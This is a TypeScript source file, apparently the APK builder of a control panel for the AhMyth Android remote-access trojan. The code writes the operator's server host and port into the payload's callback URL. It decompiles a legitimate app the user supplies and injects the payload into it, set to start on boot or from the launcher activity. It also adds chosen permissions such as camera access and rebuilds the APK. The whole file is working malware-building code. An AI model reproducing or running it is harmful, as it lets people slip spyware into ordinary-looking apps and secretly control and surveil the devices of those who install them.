    if (!updatedLaunchActivityCode) return;

    const writeResult = await execStage<boolean>(
        payload,
        "Writing modified launcher activity's smali file...",
        async (updateStatus) => {
            try {
                logger.verbose(
                    `Writing modified launcher activity's smali file...`,
                    {
                        label: 'payload',
                        action: 'generate-apk',
                    },
                );

                await writeFile(
                    join(apkFolder, launcherPath),
                    updatedLaunchActivityCode,
                    'utf8',
                );

                await updateStatus(PayloadLogStatus.SUCCESS);

                return true;
            } catch (error) {
                logger.error(
                    `Failed to write modified launcher activity's smali file!`,
                    {
                        label: 'payload',
                        action: 'generate-apk',
                        error,
                    },
                );

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    "Failed to write modified launcher activity's smali file! Please try again.",
                );

                return false;
            }
        },
    );

    if (!writeResult) return;

    const updatedManifestXml = await execStage<string | null>(
        payload,
        "Updating SDK versions in target APK's manifest...",
        async (updateStatus) => {
            try {
                logger.verbose(
                    "Updating SDK versions in target APK's manifest...",
                    {
                        label: 'payload',
                        action: 'generate-apk',
                    },
                );

                const compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                const compSdkVerNameRegex =
                    /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
                const platVerCoRegex =
                    /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                const platVerNameRegex =
                    /\b(platformBuildVersionName=\s*")\d{1,2}"/;

                const repXmlSdk = modifiedXml
                    .replace(compSdkVerRegex, '$122' + '"')
                    .replace(compSdkVerNameRegex, '$111' + '"')
                    .replace(platVerCoRegex, '$122' + '"')
                    .replace(platVerNameRegex, '$111' + '"');

                await updateStatus(PayloadLogStatus.SUCCESS);

                return repXmlSdk;
            } catch (error) {
                logger.error(
                    'Failed to modify SDK versions in target manifest!',
                    {
                        label: 'payload',
                        action: 'generate-apk',
                        error,
                    },
                );

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    'Failed to modify SDK versions in target manifest! Please try again.',
                );

                return null;
            }
        },
    );

    if (!updatedManifestXml) return;

    const writeManifestResult = await execStage<boolean>(
        payload,
        "Writing modified manifest to target APK's manifest...",
        async (updateStatus) => {
            try {
                logger.verbose(
                    `Writing modified manifest to target APK's manifest...`,
                    {
                        label: 'payload',
                        action: 'generate-apk',
                    },
                );

                await writeFile(
                    join(apkFolder, 'AndroidManifest.xml'),
                    updatedManifestXml,
                    'utf8',
                );

                await updateStatus(PayloadLogStatus.SUCCESS);

                return true;
            } catch (error) {
                logger.error(
                    `Failed to write modified manifest to target APK's manifest!`,
                    {
                        label: 'payload',
                        action: 'generate-apk',
                        error,
                    },
                );

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    "Failed to write modified manifest to target APK's manifest! Please try again.",
                );

                return false;
            }
        },
    );

    if (!writeManifestResult) return;

    const apktoolYml = await execStage<string | null>(
        payload,
        'Reading the "apktool.yml" File...',
        async (updateStatus) => {
            logger.verbose('Reading the "apktool.yml" File...', {
                label: 'payload',
                action: 'generate-apk',
            });

            try {
                const data = await readFile(
                    join(apkFolder, 'apktool.yml'),
                    'utf8',
                );

                await updateStatus(PayloadLogStatus.SUCCESS);

                return data;
            } catch (error) {
                logger.error('Unable to Read the "apktool.yml" File!', {
                    label: 'payload',
                    action: 'generate-apk',
                    error,
                });

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    'Unable to Read the "apktool.yml" File. Please try again.',
                );

                return null;
            }
        },
    );

    if (!apktoolYml) return;

    const updatedApktoolYml = await execStage<string | null>(
        payload,
        "Updating the target SDK version in the 'apktool.yml' File...",
        async (updateStatus) => {
            try {
                logger.verbose(
                    'Updating the target SDK version in the "apktool.yml" File...',
                    {
                        label: 'payload',
                        action: 'generate-apk',
                    },
                );

                const minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                const tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;

                const updated = apktoolYml
                    .replace(minSdkRegex, "$119'")
                    .replace(tarSdkRegex, "$122'");

                await updateStatus(PayloadLogStatus.SUCCESS);

                return updated;
            } catch (error) {
                logger.error(
                    "Unable to update the target SDK version in the 'apktool.yml' File!",
                    {
                        label: 'payload',
                        action: 'generate-apk',
                        error,
                    },
                );

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    "Unable to update the target SDK version in the 'apktool.yml' File. Please try again.",
                );

                return null;
            }
        },
    );

    if (!updatedApktoolYml) return;

    const writeApktoolYmlResult = await execStage<boolean>(
        payload,
        "Writing the updated 'apktool.yml' File...",
        async (updateStatus) => {
            try {
                logger.verbose("Writing the updated 'apktool.yml' File...", {
                    label: 'payload',
                    action: 'generate-apk',
                });

                await writeFile(
                    join(apkFolder, 'apktool.yml'),
                    updatedApktoolYml,
                    'utf8',
                );

                await updateStatus(PayloadLogStatus.SUCCESS);

                return true;
            } catch (error) {
                logger.error(
                    "Unable to write the updated 'apktool.yml' File!",
                    {
                        label: 'payload',
                        action: 'generate-apk',
                        error,
                    },
                );

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    "Unable to write the updated 'apktool.yml' File. Please try again.",
                );

                return false;
            }
        },
    );

    if (!writeApktoolYmlResult) return;

    await injectAhmythFilesAndGenerateApk(payload, apkFolder);
};

const buildBinded = async (payload: PayloadEntity): Promise<void> => {
    const apkFolder = await execStage<string | null>(
        payload,
        'Decompiling the APK using apktool...',
        async (updateStatus) => {
            try {
                const apkFolder = await mkdtemp(
                    join(tmpdir(), 'decompiled-apk-'),
                );

                logger.verbose(`Decompiling APK to ${apkFolder}...`, {
                    label: 'apk-builder',
                    action: 'build',
                });

                const decompileApk = `java -jar "${apktoolJar}" d "${resolve(
                    process.cwd(),
                    config.APK_UPLOAD_PATH,
                    payload.existingAPK ?? '',
                )}" -f -o "${apkFolder}"`;

                await execCommand(decompileApk);

                await updateStatus(PayloadLogStatus.SUCCESS);

                return apkFolder;
            } catch (error) {
                logger.error('Failed to decompile APK!', {
                    label: 'apk-builder',
                    action: 'build',
                    error,
                });

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    'Failed to decompile APK. Please try again.',
                );

                return null;
            }
        },
    );

    if (!apkFolder) return;

    const targetManifestPath = join(apkFolder, 'AndroidManifest.xml');

    const targetManifest = await execStage<string | null>(
        payload,
        "Reading target APK's manifest...",
        async (updateStatus) => {
            try {
                logger.verbose(
                    `Reading target APK's manifest from ${targetManifestPath}...`,
                    {
                        label: 'payload',
                        action: 'generate-apk',
                    },
                );

                const data = await readFile(targetManifestPath, 'utf8');

                await updateStatus(PayloadLogStatus.SUCCESS);

                return data;
            } catch (error) {
                logger.error(
                    `Failed to read the target APK's manifest from ${targetManifestPath}!`,
                    {
                        label: 'payload',
                        action: 'generate-apk',
                        error,
                    },
                );

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    "Failed to read the target APK's manifest! Please try again.",
                );

                return null;
            }
        },
    );

    if (!targetManifest) return;

    const modifiedXml = await modifyManifest(payload, targetManifest);

    if (!modifiedXml) return;

    if (payload.bindingMethod === BindingMethod.BOOT) {
        await bindOnBoot(payload, apkFolder, modifiedXml);
    } else {
        await bindOnActivity(payload, apkFolder, modifiedXml);
    }
};

const buildStandalone = async (payload: PayloadEntity): Promise<void> => {
    const selectedPermissions = await execStage(
        payload,
        'Building permissions list...',
        async (updateStatus) => {
            const permissions = getSelectedPermissions(payload);

            await updateStatus(PayloadLogStatus.SUCCESS);

            return permissions;
        },
    );

    const updateManifestResult = await execStage<boolean>(
        payload,
        "Updating permissions in the 'AndroidManifest.xml'...",
        async (updateStatus) => {
            try {
                logger.verbose('Reading the Payload Manifest File...', {
                    label: 'payload',
                    action: 'generate-apk',
                });

                const data = await readFile(
                    join(extractedPath, 'AndroidManifest.xml'),
                    'utf8',
                );

                logger.verbose('Parsing the Payload Manifest Data...', {
                    label: 'payload',
                    action: 'generate-apk',
                });

                const parsedData: IAndroidManifest =
                    await xml2js.parseStringPromise(data);

                logger.verbose(
                    'Inserting the Selected Payload Permissions...',
                    {
                        label: 'payload',
                        action: 'generate-apk',
                    },
                );

                parsedData.manifest['uses-permission'] = [];
                parsedData.manifest['uses-feature'] = [];

                // Add new permissions and features based on selectedPermissions
                selectedPermissions.forEach((permission) => {
                    if (permission.startsWith('android.hardware.camera')) {
                        parsedData.manifest['uses-feature'].push({
                            $: {
                                'android:name': permission,
                            },
                        });
                    } else {
                        parsedData.manifest['uses-permission'].push({
                            $: {
                                'android:name': permission,
                            },
                        });
                    }
                });

                // Convert the parsed data back to XML
                const builder = new xml2js.Builder();
                const updatedData = builder.buildObject(parsedData);
                await writeFile(
                    join(extractedPath, 'AndroidManifest.xml'),
                    updatedData,
                    'utf8',
                );
                logger.info("Updated the Payload's Manifest File", {
                    label: 'payload',
                    action: 'generate-apk',
                });

                await updateStatus(PayloadLogStatus.SUCCESS);

                return true;
            } catch (error) {
                logger.error(
                    'Error occurred while processing the Payload Manifest!',
                    {
                        error,
                        label: 'payload',
                        action: 'generate-apk',
                    },
                );

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    "Failed to update the Payload's Manifest File!",
                );

                return false;
            }
        },
    );

    if (!updateManifestResult) return;

    await generateApk(payload, extractedPath);
};

export const buildAPK = async (payload: PayloadEntity): Promise<void> => {
    try {
        payload.status = PayloadStatus.INPROGRESS;
        await payload.save();

        getSocketService().payloadsRoom.emit(
            ServerToWebEvents.PAYLOAD_UPDATED,
            payload,
        );
    } catch (error) {
        logger.error('Failed to update payload status!', {
            label: 'apk-builder',
            action: 'update-status',
            error,
        });

        return;
    }

    const checkJavaVersionResult = await execStage<boolean>(
        payload,
        'Checking Java Version...',
        async (updateStatus) => {
            try {
                const javaVersion = await checkJavaVersion();

                if (javaVersion < 11) {
                    logger.error('Java version is too low!', {
                        label: 'apk-builder',
                        action: 'check-java-version',
                        javaVersion,
                    });

                    await updateStatus(
                        PayloadLogStatus.FAILED,
                        'Java version 11 or higher is required. Please install Java 11 and try again.',
                    );

                    return false;
                } else if (javaVersion > 11) {
                    logger.warn(
                        `Java version 11 is recommended but found ${javaVersion}`,
                        {
                            label: 'apk-builder',
                            action: 'check-java-version',
                            javaVersion,
                        },
                    );
                }

                await updateStatus(PayloadLogStatus.SUCCESS);

                return true;
            } catch (error) {
                logger.error('Failed to determine Java version!', {
                    label: 'apk-builder',
                    action: 'check-java-version',
                    error,
                });

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    `Failed to determine Java version. Please make sure Java 11 is installed and try again.`,
                );

                return false;
            }
        },
    );

    if (!checkJavaVersionResult) return;

    const updateSocketResult = await execStage<boolean>(
        payload,
        'Updating socket server host and port...',
        async (updateStatus) => {
            logger.verbose(
                `Reading socket host file from ${socketUrlFile}...`,
                {
                    label: 'apk-builder',
                    action: 'update-socket-server',
                },
            );
            let data: string | null = null;

            try {
                data = await readFile(socketUrlFile, 'utf8');
            } catch (error) {
                logger.error('Failed to read socket host file!', {
                    label: 'apk-builder',
                    action: 'update-socket-server',
                    error,
                });

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    'Failed to read socket host file. Please try again.',
                );

                return false;
            }

            logger.verbose('Updating socket host in smali code...', {
                label: 'apk-builder',
                action: 'update-socket-server',
            });

            const result = data.replace(
                data.substring(
                    data.indexOf('http://'),
                    data.indexOf('?model='),
                ),
                'http://' + payload.server + ':' + payload.port,
            );

            try {
                await writeFile(socketUrlFile, result, 'utf8');

                logger.verbose('Socket host updated successfully!', {
                    label: 'apk-builder',
                    action: 'update-socket-server',
                });

                await updateStatus(PayloadLogStatus.SUCCESS);

                return true;
            } catch (error) {
                logger.log('Failed to update socket host in smali code!', {
                    label: 'apk-builder',
                    action: 'update-socket-server',
                    error,
                });

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    'Failed to update socket host in smali code. Please try again.',
                );

                return false;
            }
        },
    );

    if (!updateSocketResult) return;

    if (payload.packagingMode === PackagingMode.STANDALONE) {
        await buildStandalone(payload);
    } else {
        await buildBinded(payload);
    }
};
